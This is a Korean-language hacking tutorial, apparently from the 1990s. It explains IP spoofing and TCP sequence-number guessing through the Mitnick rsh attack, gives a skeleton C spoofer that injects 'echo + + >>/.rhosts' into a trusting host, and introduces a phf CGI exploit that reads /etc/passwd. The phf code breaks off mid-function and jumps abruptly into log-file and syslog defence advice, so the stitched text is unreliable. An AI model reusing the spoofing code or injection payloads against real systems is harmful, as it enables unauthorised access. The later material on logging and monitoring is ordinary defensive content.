@@ -1,0 +1,189 @@
+﻿해킹정보..
+좀더 고수준의 해킹 방법중의 하나인
+spoofing에 대해서 알아보도록 하자.
+IP 스푸핑이란?
+spoof란 단어는 '속이다, 사기치다'는 뜻이다.
+즉 쉽게 설명하면 해커가 머물러있는, 또는 단순히 악용하고자 하는 호스트의 IP
+어드레스를 바꾸어서 이를 통해 해킹을 하는 것이다.
+가령 A란 호 스트와 B란 호스트가 하드디 스크를 공유하고 있는데 A 란 호스트와
+B란 호스트는 보안이 잘 되 어서 해킹하기가 보통 어려운 것이 아니라고 하자.
+하지만 어떻게서든지 B란 호스트 안에 있는 일급 극비 문서를 훔쳐오고 싶다면
+어떻게 해야 할 까?
+그렇다면 해커의 최선의 선택 방법은 다음과 같다.
+우선 자신이 머물러 있는 호스트의 IP 어 드레스를 B의 어드레스로 위장을 한다.
+위장을 하면 B 의 호스트의 화면에는 duplicated IP address 라는 문장이 찍히게
+되고 B호스트는 네트워크 기능을 잠시 상실하게 된다.
+이때를 놓치지 않고 해커의 호스트는 A 호스트에게 자신이 진짜 B호스트라는
+정보를 보내어 A호 스트와 같이 하드 디스크를 공유 하도록 시도한다.
+성공하게 되면 해커는 A호스트의 하드디스크 에 있는 극비 문서를 A호스트나 B
+호스트에 잡입하지 않고도 얻어낼 수 있게 된다.
+또한 IP 스푸핑과 항상 연동돼 사용되는 공격법으로 TCP sequence number
+guessing attack을 들 수 있다.
+이에 대해서도 잠시 설명해볼까 한다.
+TCP Sequence Number Guessing Attack이란?
+과거에 Internet worm의 저자로도 유명했던 Robert T.Morris가 벨 연구소에서
+인턴쉽으로 일할 때 썼던 논문에서 처음으로 알려 졌고 AT&T사의 Bellovin S.M이
+89년에 쓴 논문에서도 언급이 되었 던 공격 방법이다(Security Problems in the
+TCP/IP Protocol Suite).
+케빈 미트닉이 사용한 방법 또한, 이런 공격을 이용해 작년도에 시큐리티계를
+떠들석하게 했었던 사건이 하나 있다.
+바로 케 빈 미트닉이 시모무라 쓰토무( 슈퍼컴퓨터 센터 소속 연구원)의
+컴퓨터를 공격해 자료를 빼간 뒤 관리자인 시모무라 쓰토무를 조롱하고 달아난
+사건이다.
+케빈 미트닉은 상당기간 동안 잡히지 않 다가 시모무라 쓰토쿠의 눈물겨운
+추적끝에 간신히 잡힌 것으 로 이 사건은 결말나게 되었다.
+케 빈 미트닉이 체포되어 잡혀가면서 시모무라에게 "당신의 실력은 정말
+놀라왔소." 라고 말해 더 유 명해진 사건이기도 하다.
+바로 이 사건에서 케빈 미트닉이 쓴 방법도 TCP Sequence Number guessing
+attack의 특 별한 한 형태라고 할 수 있다 . (미트닉이 사용한 방법은 IP
+어드레스를 spoof 해서 Berkerly R-command(rlogin, rcp , rsh 등 등)를 공격한
+방법이었다.)
+자 이제, IP Spoofing과 TCP Sequence number guessing attack을 자세히
+알아보자.
+간단히 A와 B라 는 호스트가 서로를 trust하 고 있다고 가정하자.
+자신의 PC의 IP 어드레스를 B라는 호스트로 바 꾸고 A에게 접근하면 가능성 이
+있지 않겠느냐라고 의문을 제 기하는 분이 계실지도 모르겠으나 자신의 위치가
+B라는 호스트가 위치한 곳보다 A보다 훨씬 더 시간적으로 유리한 위치, 즉 LAN
+에서나 가능할 법한 이야기다.
+그 외의 경우에는 거의 소용이 없다고 보아도 무방하다..
+자신의 IP 어드레스를 변조해도 B라는 trusted host가 A에게로 도달하는 거리가
+멀 뿐만 아니라. 자신의 서브넷에서 다른 IP 어드레스를 가진 패킷을 날린다는
+것은 라우팅 상의 문제를 비롯해 갖가지 문제점이 제기된다.
+그럼 케빈 미트닉이 Berkeley R-commands를 공격하는 경우를 예로 들어서 IP
+spoofing 이 어떻게 작용하나에 대해서 알아보기로 하자.
+예를 들어 해커의 호스트를 evil.com이라 하고 target.com을 공격하기 위해서
+target.com과 good.com간의 trusting Relationship을 이용하고자 한다.
+즉 , target.com # cat /.rhosts good.com root target.com # 간단히 evil.com의
+IP 어드레스를 good.com의 IP 어드레스로 바꾼 다음에target.com의 rsh server에
+접속하려고 시도했다 하자.
+이 경우에는 TCP가 갖고 있는 Initial 3-way 핸드셰이킹 때문에 커넥션 이
+이뤄지지 않는다.
+TCP 의 Initial 3-way 핸드셰이킹 의 예를 우선 들어보자.
+evil.com# telnet target.com login 할 경우 evil.com -> target.com SYN
+1415531521 // evil.com이 Initial sequence number 를 보낸다.
+target.com -> evil.com ACK 1415531521 SYN 1823083521 // target.com이
+evil.com이 보낸 ISN을 ACK하고 target.com이 자신의 // Initial sequence
+number 를 보낸다.
+evil.com -> target.com ACK 1823083521 // evil.com이 target.com의 ISN을
+ACK한다.
+위와 같은 패킷이 교환된다.
+TCP 헤더의 SYN 플래그는 'synchronize sequence numbers'이다. SYN 플래그는
+TCP Sequence Number를 동반하는데 이 넘버는 TCP/IP implementation마다
+생성되는 방 법이 약간씩 다르다. 4.4BSD에서는 OS가 초기화될 때 1로 초기
+화되고 그 후는 0.5초마다 64,000 씩 증가한다. 또한 새로운 TCP 커넥션이
+만들어질 때마다 64,000 씩 증가한다.
+단순히 evil.com의 IP 어드레스를 바꾸는 것만으로는 target.com이 evil.com한테
+보내는 ISN을 받을 수가 없고(왜냐면 target.com은 good.com에게 ISN을
+보내겠지요. 라우팅이 그렇게 되어 있을 테니 까.) 따라서 커넥션이 성립되지
+않는다.
+커넥션이 establish되려면 good.com이 target.com이 보내는 ISN이 보내는 패킷에
+응답을 하지 말아야할 뿐만 아니라(보통의 경우 good.com은 이럴 경우 RST(Reset
+connection) 패킷을 보내서 모든 것을 망친다) target.com이 good.com에게 보낸
+ISN을 추 측해서 ACK해줘야 한다. 이 두 스텝이 완벽하게 됐을 경우 echo '+ +'
+>/.rhosts 을 담은 rsh 패킷 을 보내 원하는 목적을 이룰 수가 있다.
+IP spoofer의 대략적인 코드 hose_conn(trust_host, trust_addr, seq_num,
+port_num) { ... /* sendtcppacket( struct ether_addr source_hardware addr.
+struct ehter_addr dest_hardware addr. u_long source ip addr. u_long dest ip
+addr. u_short source port. u_short dest port. u_long sequence no. u_long
+acknowledge no. int flags (SYN, RST, ACK, PUSH, FIN) char * data int
+strlen(data) */ sendtcppacket(&(eh.ether_shost), &(eh.ether_dhost),
+bad_addr, trust_addr, port_num[i], 513, seq_num, 0, TM_SYN, NULL, 0); ... }
+det_seq(targ_host, targ_addr, next_seq, offset) { ... / 커넥션을 요구하는
+패킷의 전송 / sendtcppacket(&(eh.ether_shost), &(eh.ether_dhost), my_addr,
+targ_addr, start_port, 514, start_seq, 0, TM_SYN, NULL, 0); /* readpacket(
+struct fddi_header fddi_header struct ether_header ether_header struct ip
+ip_header struct udphdr udp_header struct tcphdr tcp_header char * data int
+strlen(data) ) */ while(readpacket(NULL, &eh2, &iph, NULL, &tcph, NULL,
+NULL) != PTYPE_IP_TCP) ;
+if(ntohs(tcph.th_dport)==start_port &&ntohs(tcph.th_sport)==514) { /
+포트번호가 맞다면 reply 패킷으로 간주하고 guessing을 시작한다 /
+if(prev_seq) diff=tcph.th_seq-prev_seq; else diff=0; if(*offset==0)
+*offset=diff; prev_seq=tcph.th_seq; sendtcppacket(&(eh.ether_shost),
+&(eh_ether_dhost), my_addr, targ_addr, start_port++, 514, start_seq++, 0,
+TM_RST, NULL, 0); ... } spoof_conn(trust_addr, targ_host, targ_addr,
+next_seq) { char *string="0\0root\0root\0echo + + >>/.rhosts\0"; / SYN
+패킷을 고유한 시퀀스 번호에 맞춰 전송 / sendtcppacket(&(eh.ether_shost),
+&(eh.ether_dhost), trust_addr, targ_addr, port, 514, seq++, 0, TM_SYN,
+NULL, 0); usleep(5000); / guess한 시퀀스번호에 맞춰 ACK 패킷을 전송 /
+sendtcppacket(&(eh.ether_shost), &(eh.ether_dhost), trust_addr, targ_addr,
+port, 514, seq, ++next_seq, TM_ACK, NULL, 0); / rsh request를 시퀀스번호와
+ACK번호에 맞추어 전송 / sendtcppacket(&(eh.ether_shost), &(eh.ether_dhost),
+trust_addr, targ_addr, port, 514, seq, next_seq, TM_ACK, string,
+stringlen); seq+=stringlen; / 전송한 패킷이 ACK되어 처리되기를 기다린다 /
+sleep(1); / 새로운 시퀀스번호에 맞추어 FIN패킷을 전송 /
+sendtcppacket(&(eh.ether_shost), &(eh.ether_dhost), trust_addr, targ_addr,
+port, 514, seq, next_seq, TM_FIN, NULL, 0); / RST패킷 전송, 커넥션 파기./
+sendtcppacket(&(eh.ether_shost), &(eh.ether_dhost), trust_addr, targ_addr,
+port, 514, seq+4, next_seq+4, TM_RST, NULL, 0); ... } main(argc, argv) { /*
+initialization of the packet */ init_filter("tcp", NULL); /* trusted host의
+513번 포트에 대해 flooding 시작 */ hose_trusted(argv[1], trust_addr,
+seq_num, port_num); /* guessing Sequence Number */ det_seq(argv[2],
+targ_addr, &next_seq, &offset); /* 실제 spoofing한 커넥션을 시작. 이때에는
+다음 시퀀스번호를 알고있다 */ spoof_conn(trust_addr, argv[2], targ_addr,
+next_seq); /* 모든 커넥션을 reset. */ reset_trusted(argv[1], trust_addr,
+seq_num, port_num); exit(0); } * IP spoofing 에 대해서는 다음의 정보를
+참조하자. {{{{ftp://ftp.research.att.com/dist/internet_security }} }}
+Bellovin paper : ipext.ps.Z -> "Security Problems in the TCP/IP Protocol
+Suite" Morris paper : 117.ps.Z -> "A Weakness in the 4.2BSD Unix TCP/IP
+Software" CERT_advisory CA-95:01.IP.spoofing
+넷스케이프를 이용한 해킹
+마지막으로 최근 많은 인기를 얻고 있는 넷스케이프를 이용해 해킹하는 기법에
+대해 살펴보자.
+NCSA HTTPD를 이용한 해킹 참조:
+CERT Advisory CA-95:04 CIAC Advisory F-11: UNIX NCSA httpd Vulnerability
+NCSA HTTPD를 돌리는 호스트의 관리자들은 소스에 CERT Advisory CA-95:04에서
+제시한 패치 를 적용한 후 돌려주기 바란다. httpd 프로세스가 작동하는 동안
+외부의 해커가 아무런 인증 절차 없이 NCSA httpd가 임의의 명령어를 수행하도록
+할 수 있다. 비록 machine instruction level이어서 공격당하기 그리 쉬운
+버그는 아니지만 주의가 요구되는 바이다. 현재 NCSA에서는 이 홀을 패치 한
+소스와 바이너리 버전 1.3R을 내놓고 있다. 또한 NCSA의 cgi-bin의 예제로
+따라오는 프로그램 중 phf라는 프로그램이 있다.
+이 프로그램의 문 제는 popen(3S)이 새로운 라인이 들어올 경우 새로운 command
+로 인식하기 때문에 문제가 발생한 다. cgi-bin 프로그램이 popen을 사용할 경우
+다음과 같은 류의 프로그램을 이용해 쉽게 exploit될 수 있다. 아래의 코드는
+기본적으로 NCSA에 딸려오는 /cgi-bin/phf 를 이용하고 있다. 언론의 성격상
+전부를 싣지는 않고 주요한 부분만을 싣는 것을 양해해 주기 바란다.
+/* Usage : get hostname 'command you wanna execute' EX : get targethost
+'cat /etc/passwd' */ /* 주요 함수 몇 가지만을 적었다. */ int writen( fd ,
+buf, nbytes ) register int fd ; register char *buf ; register int nbytes ;
+{ int nleft , nwritten ; nleft = nbytes ; while( nleft >0 ) { nwritten =
+write( fd , buf , nleft ); if( nwritten }} {{ }}{{ }}/usr/adm/lastlog {{
+}}각 유저마다 가장 최근의 로그인 시간을 기록한 다. finger 나 someone 에
+의해 알 수 있다. {{ }}{{ }}/etc/utmp {{ }}유저가 로그인할 때마다 시간을
+적어둔다. {{ }}{{ }}/usr/adm/wtmp {{ }}유저가 로그인/로그아웃할 때 시간을
+적어둔다. last 또는 last someone 의 명령을 쳐서 내용을 알 수 있다. {{ }}{{
+}}/usr/adm/acct {{ }}유저들이 사용하는 명령어를 적어둔다. lastcomm 을 치면
+내용을 알 수 있다. {{ }} 하지만, 실제로 해커들은 이 모든 파일들을 지우고
+나가는 것이 보통이며(생각을 보라, 나갈 때 자기가 들어왔다는 증거를 입멸
+하고 나가는 것이 해커의 입장으로서는 당연한 것이 아니겠는가), 따라서 일정한
+시간 간격마다 혹은 하루의 어느 때에 수행하도록 제어해주는 cron명령을 이용해
+계속 위의 파일을 백업을 한다 면 해커를 좀더 어렵게 만들 수 있겠다. 이는
+관리자에게 필요 한 부분이지만, 안전한 호스트를 선택해 log만을 남기는
+호스트를 두면 더욱 확실하다.(이는 물론 장 비에 여유가 있을 때의 이야
+기이다)
+예를 들면, /etc/syslog.conf 에서 정의를 하도록 하자.
+# # syslog configuration file # define LOGHOST eve
+*.err;kern.debug;auth.notice;user.none /dev/console mail.debug
+ifdef('LOGHOST',/var/log/syslog,@loghost) mail.debug /var/log/syslog 로그
+호스트를 설정한 예를 들어보자. 다음 로그는 로그 호스트인 eldar 의 로그
+파일에 기록된 것이다. elbereth, luthien, be ren, eru, frodo, sam, aragorn,
+gandalf, faramir, legolasgimli, indigo1,3,4,10, applic이 eldar로 로그를 보
+내도록 설정돼있다. Mar 17 02:43:28 6C:eldar fingerd[17516]: connect from
+baikdu.kaist.ac.kr Mar 17 02:43:42 6D:eldar ftpd[17518]: connection from
+baikdu.kaist.ac.kr Mar 17 02:43:54 5E:eldar ftpd[17518]: FTP LOGIN FAILED
+FROM baikdu.kaist.ac.kr, chester Mar 17 02:44:15 6E:eldar ftpd[17518]: FTP
+LOGIN FROM baikdu.kaist.ac.kr as chester Mar 17 09:37:16
+6C:luthien.seri.re.kr sendmail[10578]: JAA10572: to=sysuh@kigam.re.kr,
+ctladdr=news (15/15), delay=00:0 0:09, mailer=smtp, relay=sdp.kigam.re.kr.
+[134.75.144.201], stat=Sent (JAA15213 Message accepted for delivery) Mar 17
+13:31:46 6B:frodo.seri.re.kr Xsession: poison: login Mar 17 13:40:32
+6C:gimli.seri.re.kr ftpd[533]: connect from eve.kaist.ac.kr Mar 17 13:49:32
+6D:indigo1.seri.re.kr ftpd[533]: connection from robin.kaist.ac.kr
+이런 방법 외에도 파이어월, TCP wrapper 등을 이용해 아예 외부에서의 접근을
+막아버릴 수 있 다.
+물론 tcpdump나 netmon들을 사용해 자신의 호스트로의 모든 접근을 감시할 수도
+있다. 이와 같이 방어하는 기술도 점점 고도 화가 되어 고 수준의 해커가 아니
+면 침투하기 어려운 호스트가 늘어가고 있다. 그 무수한 버그들을 모두 머리에
+외어두고 이를 모두 패치하기란 상당히 어려운 일이다. 이런 경 우에는 보안툴을
+이용하여 체크를 하는 것이 많은 시간을 절약할 수 있게 된다.
+         
